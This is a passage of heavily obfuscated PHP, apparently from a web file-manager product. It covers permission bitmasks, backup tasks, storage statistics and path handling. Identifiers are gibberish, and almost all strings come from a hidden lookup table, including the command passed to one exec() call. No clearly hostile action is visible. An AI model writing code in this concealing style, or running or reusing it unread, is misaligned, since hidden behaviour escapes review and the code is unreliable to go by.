Model($†ë¿–±¹[907])->where($í—™áŠ’)->count($†ë¿–±¹[193]); return array($†ë¿–±¹[846] => $½é¬ØÈæ, $†ë¿–±¹[1913] => $‡Œšù¨, $†ë¿–±¹[1945] => $½é¬ØÈæ - $‡Œšù¨, $†ë¿–±¹[1946] => (int) $Ê²«ŠÕÅ, $†ë¿–±¹[848] => (int) $ª¶ğÖÉ¯, $†ë¿–±¹[1947] => (int) $¿ôíõ¼¬); } private function optionAccess() { $¾±†ÆØ® =& $_SERVER[²Ö÷öõ]; return array($¾±†ÆØ®[841] => $this->typeLogCnt(), $¾±†ÆØ®[110] => $this->typeLogCnt($¾±†ÆØ®[110]), $¾±†ÆØ®[525] => $this->typeLogCnt($¾±†ÆØ®[525]), $¾±†ÆØ®[1948] => $this->typeLogCnt($¾±†ÆØ®[1948]), $¾±†ÆØ®[1949] => $this->typeLogCnt($¾±†ÆØ®[1949]), $¾±†ÆØ®[662] => $this->typeLogCnt($¾±†ÆØ®[12], $¾±†ÆØ®[1924])); } private function typeLogCnt($îì Ñú = '', $¸®åèàÌ = "\151\144") { $Ì—ÖÆ =& $_SERVER[²Ö÷öõ]; $‚ŠÆˆá = array($Ì—ÖÆ[110] => array($Ì—ÖÆ[1950], $Ì—ÖÆ[1951]), $Ì—ÖÆ[525] => array($Ì—ÖÆ[1952], $Ì—ÖÆ[1953]), $Ì—ÖÆ[1948] => array($Ì—ÖÆ[1954], $Ì—ÖÆ[1955], $Ì—ÖÆ[1956]), $Ì—ÖÆ[1949] => array($Ì—ÖÆ[1957], $Ì—ÖÆ[1958]), $Ì—ÖÆ[1959] => array($Ì—ÖÆ[1960], $Ì—ÖÆ[1961], $Ì—ÖÆ[1962])); $Ê¸ šµº = strtotime(date($Ì—ÖÆ[1920])); $ïú¹•Ş‹ = array($Ì—ÖÆ[231] => array($Ì—ÖÆ[1100], $Ê¸ šµº)); if ($îì Ñú) { $ïú¹•Ş‹[$Ì—ÖÆ[33]] = array($Ì—ÖÆ[7], $‚ŠÆˆá[$îì Ñú]); } $©åÂ’´ = Model($Ì—ÖÆ[1923])->where($ïú¹•Ş‹)->count($¸®åèàÌ); return (int) $©åÂ’´; } private function optionServer() { $µäß¢ =& $_SERVER[²Ö÷öõ]; $ùÌÙı´î = $this->diskDriver(); $íÇÏ‰ŒÖ = KodIO::defaultDriver(); $ÓÏ»ï´è = array($µäß¢[900] => $íÇÏ‰ŒÖ[$µäß¢[475]]); $´ñ‰•ûÈ = Model($µäß¢[544])->where($ÓÏ»ï´è)->sum($µäß¢[79]); $¾´ê’ = explode($µäß¢[53], $_SERVER[$µäß¢[147]]); $ÔåŸŒÏº = $¾´ê’[0]; $ê¼¹Áîƒ = $GLOBALS[$µäß¢[6]][$µäß¢[21]]; $Á‰ÇÆ = $ê¼¹Áîƒ[$µäß¢[1062]]; if ($Á‰ÇÆ == $µäß¢[1050]) { $¹…˜Ñì‰ = explode($µäß¢[1378], $ê¼¹Áîƒ[$µäß¢[1061]]); $Á‰ÇÆ = $¹…˜Ñì‰[0]; } if ($Á‰ÇÆ == $µäß¢[998] || $Á‰ÇÆ == $µäß¢[887]) { $Éü…˜ªÒ = Model()->db()->query($µäß¢[1963]); $òÅÑõ‚â = $Éü…˜ªÒ[0] && isset($Éü…˜ªÒ[0][$µäß¢[1666]]) ? $Éü…˜ªÒ[0][$µäß¢[1666]] : 0; $Á‰ÇÆ = $µäß¢[1964] . ($òÅÑõ‚â ? $µäß¢[8] . $òÅÑõ‚â : $µäß¢[12]); } $Õêşğ¸­ = $GLOBALS[$µäß¢[6]][$µäß¢[425]][$µäß¢[909]]; return array($µäß¢[1965] => $ùÌÙı´î ? $ùÌÙı´î[$µäß¢[1966]] : 0, $µäß¢[1967] => $ùÌÙı´î ? $ùÌÙı´î[$µäß¢[1968]] : 0, $µäß¢[1969] => (int) $íÇÏ‰ŒÖ[$µäß¢[1966]] * 1024 * 1024 * 1024, $µäß¢[1970] => (int) $´ñ‰•ûÈ, $µäß¢[1971] => ucfirst($ÔåŸŒÏº), $µäß¢[1972] => $µäß¢[1973] . PHP_VERSION, $µäß¢[1974] => phpBuild64() ? 64 : 32, $µäß¢[840] => str_replace($µäß¢[1219], $µäß¢[1078], $Á‰ÇÆ), $µäß¢[425] => ucfirst($Õêşğ¸­), $µäß¢[32] => $_SERVER[$µäß¢[1975]]); } private function diskDriver() { $ÔÜ×åÚü =& $_SERVER[²Ö÷öõ]; $şÊçë™© = $ÔÜ×åÚü[8]; $¤ÈÄ°‰ = $GLOBALS[$ÔÜ×åÚü[6]][$ÔÜ×åÚü[1395]] == $ÔÜ×åÚü[1396]; if ($¤ÈÄ°‰) { $şÊçë™© = $ÔÜ×åÚü[1976]; if (function_exists($ÔÜ×åÚü[1977])) { exec($ÔÜ×åÚü[1978], $œ¼•Šõ¤); $şÊçë™© = $œ¼•Šõ¤[1] . $ÔÜ×åÚü[8]; } } if (!file_exists($şÊçë™©)) { return; } if (!function_exists($ÔÜ×åÚü[1979])) { return; } $şÈ‹™Æò = @disk_total_space($şÊçë™©); $Üß™ƒè = $şÈ‹™Æò - @disk_free_space($şÊçë™©); return array($ÔÜ×åÚü[1966] => $şÈ‹™Æò, $ÔÜ×åÚü[1968] => $Üß™ƒè); } public function fileChart($¸‘¯·ûª) { $€ÚĞÚœ =& $_SERVER[²Ö÷öõ]; if (isset($¸‘¯·ûª[$€ÚĞÚœ[1780]])) { return Model($€ÚĞÚœ[907])->userFileTypeProfile($¸‘¯·ûª[$€ÚĞÚœ[1780]]); } if (isset($¸‘¯·ûª[$€ÚĞÚœ[1980]])) { return Model($€ÚĞÚœ[907])->groupFileTypeProfile($¸‘¯·ûª[$€ÚĞÚœ[1980]]); } $Öß¤ÚÈÆ = $this->sourceSize(); $íÕÃ—í• = array($€ÚĞÚœ[192] => 0, $€ÚĞÚœ[190] => 1); $€Š¢¨æŸ = Model($€ÚĞÚœ[907])->where($íÕÃ—í•)->sum($€ÚĞÚœ[79]); $íÕÃ—í•[$€ÚĞÚœ[190]] = 2; $˜´şÛŞ = Model($€ÚĞÚœ[907])->where($íÕÃ—í•)->sum($€ÚĞÚœ[79]); return array($€ÚĞÚœ[846] => $Öß¤ÚÈÆ[$€ÚĞÚœ[79]], $€ÚĞÚœ[1913] => $Öß¤ÚÈÆ[$€ÚĞÚœ[1913]], $€ÚĞÚœ[1914] => (int) $€Š¢¨æŸ, $€ÚĞÚœ[1915] => (int) $˜´şÛŞ); } private function sourceSize() { $»Ã‰Á×„ =& $_SERVER[²Ö÷öõ]; $±§Óì™ = Model($»Ã‰Á×„[907])->where(array($»Ã‰Á×„[485] => 0))->sum($»Ã‰Á×„[79]); $§Îåµ›Ó = Model($»Ã‰Á×„[544])->sum($»Ã‰Á×„[79]); if ($§Îåµ›Ó > $±§Óì™) { $§Îåµ›Ó = $±§Óì™; } return array($»Ã‰Á×„[79] => (int) $±§Óì™, $»Ã‰Á×„[1913] => (int) $§Îåµ›Ó); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ØÂÒø¸ô =& $_SERVER[²Ö÷öõ]; $•Âï•Şà = array(array($ØÂÒø¸ô[494] => LNG($ØÂÒø¸ô[1981]), $ØÂÒø¸ô[1982] => $ØÂÒø¸ô[1983], $ØÂÒø¸ô[1984] => 1, $ØÂÒø¸ô[1985] => 1, $ØÂÒø¸ô[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ØÂÒø¸ô[494] => LNG($ØÂÒø¸ô[1987]), $ØÂÒø¸ô[1982] => $ØÂÒø¸ô[1988], $ØÂÒø¸ô[1984] => 2, $ØÂÒø¸ô[1985] => 1, $ØÂÒø¸ô[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ØÂÒø¸ô[494] => LNG($ØÂÒø¸ô[1989]), $ØÂÒø¸ô[1982] => $ØÂÒø¸ô[1990], $ØÂÒø¸ô[1984] => 3, $ØÂÒø¸ô[1985] => 1, $ØÂÒø¸ô[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ØÂÒø¸ô[494] => LNG($ØÂÒø¸ô[1991]), $ØÂÒø¸ô[1982] => $ØÂÒø¸ô[1992], $ØÂÒø¸ô[1984] => 4, $ØÂÒø¸ô[1985] => 1, $ØÂÒø¸ô[1986] => self::AUTH_SHOW | self::AUTH_VIEW), array($ØÂÒø¸ô[494] => LNG($ØÂÒø¸ô[1993]), $ØÂÒø¸ô[1982] => $ØÂÒø¸ô[1994], $ØÂÒø¸ô[1984] => 5, $ØÂÒø¸ô[1985] => 1, $ØÂÒø¸ô[1986] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ØÂÒø¸ô[494] => LNG($ØÂÒø¸ô[1995]), $ØÂÒø¸ô[1982] => $ØÂÒø¸ô[1996], $ØÂÒø¸ô[1984] => 6, $ØÂÒø¸ô[1985] => 1, $ØÂÒø¸ô[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ØÂÒø¸ô[494] => LNG($ØÂÒø¸ô[1997]), $ØÂÒø¸ô[1982] => $ØÂÒø¸ô[1998], $ØÂÒø¸ô[1984] => 7, $ØÂÒø¸ô[1985] => 1, $ØÂÒø¸ô[1986] => 0)); return $•Âï•Şà; } public static function authCheck($€Ò›¶, $“ „Å†ï) { $­Ì·ã½§ =& $_SERVER[²Ö÷öõ]; $€Ò›¶ = intval($€Ò›¶); if (KodUser::isRoot() && $GLOBALS[$­Ì·ã½§[6]][$­Ì·ã½§[1999]]) { return !0; } if ($€Ò›¶ <= 0) { return !1; } if (($€Ò›¶ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($€Ò›¶ & $“ „Å†ï); } public static function authCheckShow($Àó»¡†) { return self::authCheck($Àó»¡†, self::AUTH_SHOW); } public static function authCheckView($‹–Æ´Åü) { return self::authCheck($‹–Æ´Åü, self::AUTH_VIEW); } public static function authCheckDownload($‰µáÀ¡») { return self::authCheck($‰µáÀ¡», self::AUTH_DOWNLOAD); } public static function authCheckUpload($ØàäÁØ) { return self::authCheck($ØàäÁØ, self::AUTH_UPLOAD); } public static function authCheckEdit($şŠª™òç) { return self::authCheck($şŠª™òç, self::AUTH_EDIT); } public static function authCheckRemove($®Ö÷¸“˜) { return self::authCheck($®Ö÷¸“˜, self::AUTH_REMOVE); } public static function authCheckShare($ƒóî¯İ¬) { return self::authCheck($ƒóî¯İ¬, self::AUTH_SHARE); } public static function authCheckComment($Æ„ÌÑÇÓ) { return self::authCheck($Æ„ÌÑÇÓ, self::AUTH_COMMENT); } public static function authCheckEvent($„å¬Óö) { return self::authCheck($„å¬Óö, self::AUTH_EVENT); } public static function authCheckRoot($Â½ëä) { return self::authCheck($Â½ëä, self::AUTH_ROOT); } public static function authCheckAction($òÔæÂ², $İÌÒøã) { $»ƒ›â’— =& $_SERVER[²Ö÷öõ]; $ÍÀ–åû” = array($»ƒ›â’—[2000] => self::AUTH_VIEW, $»ƒ›â’—[1287] => self::AUTH_DOWNLOAD, $»ƒ›â’—[110] => self::AUTH_UPLOAD, $»ƒ›â’—[1949] => self::AUTH_EDIT, $»ƒ›â’—[1948] => self::AUTH_REMOVE, $»ƒ›â’—[1959] => self::AUTH_SHARE, $»ƒ›â’—[430] => self::AUTH_COMMENT, $»ƒ›â’—[1768] => self::AUTH_EVENT, $»ƒ›â’—[2001] => self::AUTH_ROOT); if (!isset($ÍÀ–åû”[$İÌÒøã])) { return; } $Ú°»÷ë€ = $ÍÀ–åû”[$İÌÒøã]; $òÔæÂ² = intval($òÔæÂ²); if ($òÔæÂ² <= 0) { return !1; } if (($òÔæÂ² & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($òÔæÂ² & $Ú°»÷ë€); } public static function authDisable($Ş¸©¾ªë, $´ªöŞ’) { if (intval($Ş¸©¾ªë) <= 0) { return 0; } return intval($Ş¸©¾ªë) & ~$´ªöŞ’; } public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x73\157\x75\x72\143\x65\x41\165\x74\x68\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\x61\165\164\150", "\x6c\141\x62\145\154", "\x64\x69\163\160\x6c\x61\171", "\x73\x79\163\x74\145\x6d", "\163\x6f\x72\x74"); public function initData() { $ÒïöùÀ = $this->authDefault(); foreach ($ÒïöùÀ as $‰ìÃÓÕı) { $this->add($‰ìÃÓÕı); } } public function findAuth($Ò£èù£, $ëÛ±¨Ã÷) { $¼¦¢Šéô =& $_SERVER[²Ö÷öõ]; $òøüÁäº = parent::listData(); foreach ($òøüÁäº as $€¿…Áß‹) { $æ×ó½”æ = intval($€¿…Áß‹[$¼¦¢Šéô[487]]); if ($æ×ó½”æ <= 0 || $€¿…Áß‹[$¼¦¢Šéô[2002]] == 0) { continue; } if (($æ×ó½”æ & $Ò£èù£) != $Ò£èù£) { continue; } if (($æ×ó½”æ & $ëÛ±¨Ã÷) != 0) { continue; } return $€¿…Áß‹[$¼¦¢Šéô[475]]; } return !1; } public function findAuthReadOnly() { $ßÀšĞ’† = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $èÆœƒÓÆ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ßÀšĞ’†, $èÆœƒÓÆ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Ï³üæ»÷ =& $_SERVER[²Ö÷öõ]; $İ·‹Çû¬ = parent::listData(); $‹Ìµ¥åø = !1; foreach ($İ·‹Çû¬ as $ûñüèÑÅ) { if ($ûñüèÑÅ[$Ï³üæ»÷[487]] <= 0 || $ûñüèÑÅ[$Ï³üæ»÷[2002]] == $Ï³üæ»÷[228]) { continue; } if (!$‹Ìµ¥åø) { $‹Ìµ¥åø = $ûñüèÑÅ; continue; } if ($‹Ìµ¥åø[$Ï³üæ»÷[487]] > $ûñüèÑÅ[$Ï³üæ»÷[487]]) { $‹Ìµ¥åø = $ûñüèÑÅ; } } return $‹Ìµ¥åø ? $‹Ìµ¥åø[$Ï³üæ»÷[475]] : $Ï³üæ»÷[12]; } public function listData($¡æÆ©— = false, $±—ÈêÊå = "\x73\x6f\162\x74", $¥“çá­ = false) { return parent::listData($¡æÆ©—, $±—ÈêÊå, $¥“çá­); } public function update($äû¶ùƒÒ, $Êƒæş¨†) { $§¤ˆ…‹ë =& $_SERVER[²Ö÷öõ]; $’§›—Û = parent::listData($äû¶ùƒÒ); $¾ˆâ¨À® = $this->findByName($Êƒæş¨†[$§¤ˆ…‹ë[32]]); if (!$’§›—Û || $¾ˆâ¨À® && $¾ˆâ¨À®[$§¤ˆ…‹ë[475]] != $’§›—Û[$§¤ˆ…‹ë[475]]) { return !1; } $this->filterAuth($Êƒæş¨†[$§¤ˆ…‹ë[487]]); return parent::update($äû¶ùƒÒ, $Êƒæş¨†); } public function remove($“šÑ›Ê”) { $…ˆ¹¿ß = parent::listData($“šÑ›Ê”); if (!$…ˆ¹¿ß || $…ˆ¹¿ß[$_SERVER[²Ö÷öõ][191]]) { return !1; } return parent::remove($“šÑ›Ê”); } public function add($ª®’±Ï = array()) { $¦ã¡æç· =& $_SERVER[²Ö÷öõ]; if ($this->findByName($ª®’±Ï[$¦ã¡æç·[32]])) { return !1; } $Å­ÅŞ†Æ = array($¦ã¡æç·[32] => $¦ã¡æç·[12], $¦ã¡æç·[487] => 1, $¦ã¡æç·[2003] => $¦ã¡æç·[1990], $¦ã¡æç·[2002] => 1, $¦ã¡æç·[191] => 0, $¦ã¡æç·[2004] => 0); $ª®’±Ï = array_merge($Å­ÅŞ†Æ, $ª®’±Ï); $ª®’±Ï[$¦ã¡æç·[2004]] = $this->getSort(); $this->filterAuth($ª®’±Ï[$¦ã¡æç·[487]]); return parent::insert($ª®’±Ï); } private function getSort() { $â»¨°ªü =& $_SERVER[²Ö÷öõ]; $Ş˜¦ = parent::listData(); $­—©†òÃ = array_to_keyvalue($Ş˜¦, $â»¨°ªü[12], $â»¨°ªü[2004]); return empty($­—©†òÃ) ? 0 : max($­—©†òÃ) + 1; } private function filterAuth(&$Ü Æ˜¼Œ) { if (!$Ü Æ˜¼Œ) { return; } $ ËÁÚ… = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $îø™ö™‡ = array(); foreach ($ ËÁÚ… as $²ÎÀ€ï’) { if ($Ü Æ˜¼Œ & $²ÎÀ€ï’) { $îø™ö™‡[] = $²ÎÀ€ï’; } } if (in_array(self::AUTH_ROOT, $îø™ö™‡)) { $Ü Æ˜¼Œ = array_sum($ ËÁÚ…); return; } $‚»² òÛ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($îø™ö™‡ as $²ÎÀ€ï’) { if (isset($‚»² òÛ[$²ÎÀ€ï’])) { $îø™ö™‡ = array_merge($îø™ö™‡, $‚»² òÛ[$²ÎÀ€ï’]); } } $îø™ö™‡[] = self::AUTH_SHOW; $Ü Æ˜¼Œ = array_sum(array_unique($îø™ö™‡)); } public function sort($§¢À¿¨±, $òôÙŞ¬Â) { return parent::update($§¢À¿¨±, $òôÙŞ¬Â); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\x62\x61\x63\x6b\165\x70\x4c\x69\x73\164"; public $field = array("\151\x6f", "\156\141\155\145", "\163\x74\141\x74\x75\x73", "\x63\x6f\156\164\x65\156\164", "\x6d\x61\156\x75\141\154", "\162\x65\163\165\154\164", "\164\x69\x6d\x65\x46\x72\x6f\x6d", "\164\x69\155\145\x54\157"); public function config() { $Àşıæ®í =& $_SERVER[²Ö÷öõ]; Action($Àşıæ®í[2005])->taskInit(); $©Ëú¥Ì¾ = Model($Àşıæ®í[853])->get($Àşıæ®í[866]); $©Ëú¥Ì¾ = json_decode($©Ëú¥Ì¾, !0); $©Ëú¥Ì¾ = is_array($©Ëú¥Ì¾) ? $©Ëú¥Ì¾ : array(); $this->parseContent($©Ëú¥Ì¾); unset($©Ëú¥Ì¾[$Àşıæ®í[1750]]); Model($Àşıæ®í[1749])->cacheClear(); $³‰Ûñ¢š = $Àşıæ®í[2006]; $¸¡©şŸó = Model($Àşıæ®í[2007])->findByKey($Àşıæ®í[1768], $³‰Ûñ¢š); if (!$¸¡©şŸó) { $¸¡©şŸó = array(); } if (isset($¸¡©şŸó[$Àşıæ®í[206]])) { $¸¡©şŸó[$Àşıæ®í[206]] = json_decode($¸¡©şŸó[$Àşıæ®í[206]], !0); } if (isset($©Ëú¥Ì¾[$Àşıæ®í[206]])) { $¸¡©şŸó[$Àşıæ®í[206]][$Àşıæ®í[1753]] = $©Ëú¥Ì¾[$Àşıæ®í[206]]; unset($©Ëú¥Ì¾[$Àşıæ®í[206]]); } return array_merge($¸¡©şŸó, $©Ëú¥Ì¾); } public function listData($Ó¸†Ù¹¶ = false, $”°•Çİù = "\155\157\x64\151\146\171\x54\151\x6d\145", $†ŒÔ«®¼ = false) { $Äğ´”ñ³ = parent::listData($Ó¸†Ù¹¶, $”°•Çİù, !0); if (!$Äğ´”ñ³) { return $Äğ´”ñ³; } if ($Ó¸†Ù¹¶) { $Äğ´”ñ³ = array($Äğ´”ñ³); } foreach ($Äğ´”ñ³ as &$¯ğÌå´) { $this->parseContent($¯ğÌå´); } return $Ó¸†Ù¹¶ ? $Äğ´”ñ³[0] : $Äğ´”ñ³; } public function parseContent(&$õ»œª–—) { $ÇäİÂµ“ =& $_SERVER[²Ö÷öõ]; $Ÿ’Şªé = _get($õ»œª–—, $ÇäİÂµ“[171], $ÇäİÂµ“[91]); if (!in_array($Ÿ’Şªé, array($ÇäİÂµ“[859], $ÇäİÂµ“[1219]))) { $õ»œª–—[$ÇäİÂµ“[171]] = $Ÿ’Şªé == $ÇäİÂµ“[91] ? $ÇäİÂµ“[1219] : $ÇäİÂµ“[859]; } } public function lastItem() { $Úû›­«‚ = $this->listData(); return !empty($Úû›­«‚[0]) ? $Úû›­«‚[0] : null; } public function kill($™ÏÈş¥˜) { $Ğ‚¨Œ¨ï =& $_SERVER[²Ö÷öõ]; $Õœü‘»‰ = $this->listData($™ÏÈş¥˜); if (!$Õœü‘»‰ || empty($Õœü‘»‰[$Ğ‚¨Œ¨ï[32]])) { return !0; } Task::kill($Ğ‚¨Œ¨ï[865]); Task::kill($Ğ‚¨Œ¨ï[883]); Task::kill($Ğ‚¨Œ¨ï[892]); $©¬‚šò‚ = $Õœü‘»‰[$Ğ‚¨Œ¨ï[32]]; $² »À„ş = TEMP_FILES . $Ğ‚¨Œ¨ï[862] . $©¬‚šò‚ . $Ğ‚¨Œ¨ï[8]; IO::remove($² »À„ş, !1); return $this->remove($™ÏÈş¥˜); } public function remove($Äûƒ¹) { $€‡ùîÁ£ = $this->listData($Äûƒ¹); if (!$€‡ùîÁ£) { return !0; } return $this->backupRemove($€‡ùîÁ£); } private function backupRemove($³Ğ…´½) { parent::remove($³Ğ…´½[$_SERVER[²Ö÷öõ][475]]); $Ö¤ø­ú• = $this->backupPath($³Ğ…´½); IO::remove($Ö¤ø­ú•, !1); return !0; } private function backupPath($ã«ñ”Ï¥) { $ı·¡üØ =& $_SERVER[²Ö÷öõ]; $‡Ó´„¦È = $ã«ñ”Ï¥[$ı·¡üØ[32]]; $¸Î”ºÙ½ = Model($ı·¡üØ[853])->get($ı·¡üØ[854]); $úİ‡Ù½× = substr(md5($ı·¡üØ[855] . $¸Î”ºÙ½ . $‡Ó´„¦È), 0, 8); return "\173\151\157\72{$ã«ñ”Ï¥[$ı·¡üØ[835]]}\x7d\57\x64\x61\x74\x61\x62\x61\163\145\x2f\x62\x61\x63\153\x75\160\57" . $‡Ó´„¦È . $ı·¡üØ[11] . $úİ‡Ù½×; } public function start() { $¿¨óŠ„ı =& $_SERVER[²Ö÷öõ]; if ($GLOBALS[$¿¨óŠ„ı[6]][$¿¨óŠ„ı[92]][$¿¨óŠ„ı[2008]] != $¿¨óŠ„ı[91]) { return !0; } $ˆÑöƒİÙ = $this->config(); if (!$ˆÑöƒİÙ || $ˆÑöƒİÙ[$¿¨óŠ„ı[1750]] != $¿¨óŠ„ı[91]) { return !1; } if ($ˆÑöƒİÙ[$¿¨óŠ„ı[171]] == $¿¨óŠ„ı[859]) { $÷‚âş¨ = Model($¿¨óŠ„ı[853])->get($¿¨óŠ„ı[1334]); if ($÷‚âş¨ == $¿¨óŠ„ı[1335]) { $ˆÑöƒİÙ[$¿¨óŠ„ı[171]] = $¿¨óŠ„ı[1219]; } } $·ö‹¯¼Ú = $this->process(); foreach ($·ö‹¯¼Ú as $ÚÔòŒÖÆ) { if ($ÚÔòŒÖÆ) { return Task::restart($ÚÔòŒÖÆ[$¿¨óŠ„ı[475]]); } } $Ğª¦è•İ = new Backup(); $…ÚØòî = $Ğª¦è•İ->db(); if ($…ÚØòî) { $…ÚØòî = $Ğª¦è•İ->dbFile(); if ($…ÚØòî && $ˆÑöƒİÙ[$¿¨óŠ„ı[171]] == $¿¨óŠ„ı[859]) { $…ÚØòî = $Ğª¦è•İ->file(); } } Backup::set(array($¿¨óŠ„ı[833] => 1, $¿¨óŠ„ı[844] => time())); return !0; } public function process() { $ºŸÑ’É¸ =& $_SERVER[²Ö÷öõ]; $Öö‘Ä  = array($ºŸÑ’É¸[840] => Task::get($ºŸÑ’É¸[865]), $ºŸÑ’É¸[845] => Task::get($ºŸÑ’É¸[883]), $ºŸÑ’É¸[230] => Task::get($ºŸÑ’É¸[892])); $¢ï¦›­ = !1; foreach ($Öö‘Ä  as &$ë°õ‹µ¢) { if ($¢ï¦›­) { $ë°õ‹µ¢ = !1; continue; } if ($ë°õ‹µ¢) { $Ã´°•Ïû = intval(_get($ë°õ‹µ¢, $ºŸÑ’É¸[1785], 0)); if (time() - $Ã´°•Ïû > 7200) { Task::kill($ë°õ‹µ¢[$ºŸÑ’É¸[475]]); $¢ï¦›­ = !0; $ë°õ‹µ¢ = !1; } } } return $Öö‘Ä ; } public function restore() { $Ü…×÷ÚÆ =& $_SERVER[²Ö÷öõ]; ActionCall($Ü…×÷ÚÆ[1146], !0, 1); ActionCall($Ü…×÷ÚÆ[1146], !0, 0); } } goto BŠ¾•ùù»; BÜó¨Îé¸: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $šä È±• =& $_SERVER[²Ö÷öõ]; $this->objectDriver = array($šä È±•[60], $šä È±•[61], $šä È±•[62], $šä È±•[63], $šä È±•[64], $šä È±•[65], $šä È±•[66], $šä È±•[67], $šä È±•[68], $šä È±•[69], $šä È±•[70], $šä È±•[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ôÛ•¸úº) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ôÛ•¸úº, $_SERVER[²Ö÷öõ][8]); } return $ôÛ•¸úº; } public function iconvApp($¦ü£ÈÏø) { return $¦ü£ÈÏø; } public function iconvSystem($£è¶Ïùğ) { return $£è¶Ïùğ; } public function iconvTo($´Ÿ§æÀÊ, $“¹»‚Ã‡, $»û‡‹“) { $•ÕáÑ™ =& $_SERVER[²Ö÷öõ]; if (!$´Ÿ§æÀÊ || !function_exists($•ÕáÑ™[72])) { return $´Ÿ§æÀÊ; } static $İÖñäîƒ = array(); $²ô—ñïç = $“¹»‚Ã‡ . $•ÕáÑ™[73] . $»û‡‹“ . $•ÕáÑ™[74] . $´Ÿ§æÀÊ; if (isset($İÖñäîƒ[$²ô—ñïç])) { return $İÖñäîƒ[$²ô—ñïç]; } if (function_exists($•ÕáÑ™[75])) { $¶¸ŞĞ¤‚ = @mb_convert_encoding($´Ÿ§æÀÊ, $»û‡‹“, $“¹»‚Ã‡); } else { $¶¸ŞĞ¤‚ = @iconv($“¹»‚Ã‡, $»û‡‹“, $´Ÿ§æÀÊ); } $¶¸ŞĞ¤‚ = $¶¸ŞĞ¤‚ ? $¶¸ŞĞ¤‚ : $´Ÿ§æÀÊ; if (strstr($¶¸ŞĞ¤‚, $•ÕáÑ™[76])) { $¶¸ŞĞ¤‚ = str_replace($•ÕáÑ™[76], $•ÕáÑ™[11], $¶¸ŞĞ¤‚); } $İÖñäîƒ[$“¹»‚Ã‡ . $•ÕáÑ™[73] . $»û‡‹“ . $•ÕáÑ™[74] . $´Ÿ§æÀÊ] = $¶¸ŞĞ¤‚; $İÖñäîƒ[$»û‡‹“ . $•ÕáÑ™[73] . $“¹»‚Ã‡ . $•ÕáÑ™[74] . $´Ÿ§æÀÊ] = $´Ÿ§æÀÊ; $İÖñäîƒ[$»û‡‹“ . $•ÕáÑ™[73] . $“¹»‚Ã‡ . $•ÕáÑ™[74] . $¶¸ŞĞ¤‚] = $´Ÿ§æÀÊ; $İÖñäîƒ[$“¹»‚Ã‡ . $•ÕáÑ™[73] . $»û‡‹“ . $•ÕáÑ™[74] . $¶¸ŞĞ¤‚] = $¶¸ŞĞ¤‚; return $¶¸ŞĞ¤‚; } public function getPathInner($€–·æ²å) { $¤·ˆÂ¾ª = IO::init($€–·æ²å); return $¤·ˆÂ¾ª->path; } public function getPathOuter($ŠäÕ‰ Ö) { $ŸÅú’–µ =& $_SERVER[²Ö÷öõ]; $­úÑ¥Ğö = strlen(trim($this->pathBase, $ŸÅú’–µ[8])); $ŠäÕ‰ Ö = substr(trim($ŠäÕ‰ Ö, $ŸÅú’–µ[8]), $­úÑ¥Ğö); return $this->pathDriver . $ŸÅú’–µ[8] . ltrim($ŠäÕ‰ Ö, $ŸÅú’–µ[8]); } public function isParentOf($ëºÊÚ‘, $¥¥§ßÍõ) { $¸§Öª€· =& $_SERVER[²Ö÷öõ]; $ëºÊÚ‘ = rtrim(strtolower($ëºÊÚ‘), $¸§Öª€·[8]) . $¸§Öª€·[8]; $¥¥§ßÍõ = rtrim(strtolower($¥¥§ßÍõ), $¸§Öª€·[8]) . $¸§Öª€·[8]; $âë²”» = strpos($¥¥§ßÍõ, $ëºÊÚ‘) === 0; return $âë²”»; } public function getType() { $Ûæ¤èÃö =& $_SERVER[²Ö÷öõ]; $‡²×—µÉ = str_replace($Ûæ¤èÃö[77], $Ûæ¤èÃö[12], get_class($this)); return 